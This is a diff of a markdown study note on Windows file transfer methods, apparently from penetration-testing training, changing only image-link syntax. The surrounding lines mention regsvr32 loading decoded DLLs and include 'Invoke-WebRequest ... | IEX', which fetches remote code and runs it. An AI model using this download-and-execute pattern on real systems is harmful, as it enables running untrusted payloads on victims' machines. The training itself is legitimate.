@@ -18,7 +18,7 @@
     
     - regsvr32 was used to load on the decoded DLLs, which decrypted and loaded other files until the final payload
     
-![[../assets/Windows File Transfer Methods/image 183.png|image 183.png]]
+![image 183.png](../assets/Windows%20File%20Transfer%20Methods/image%20183.png)
 # Download Operations
 ## PowerShell Base64 Encode and Decode
 - used when we dont want to download something
@@ -92,7 +92,7 @@ iwr http://<IP>/<file>
   
 ### Common Errors with PowerShell
 - internet explorer launch configuration not completed (classic)
-![[../assets/Windows File Transfer Methods/image 1 137.png|image 1 137.png]]
+![image 1 137.png](../assets/Windows%20File%20Transfer%20Methods/image%201%20137.png)
 - this can be bypassed using the parameter -UseBasicParsing
 ```JavaScript
 Invoke-WebRequest https://<url> -UseBasicParsing | IEX
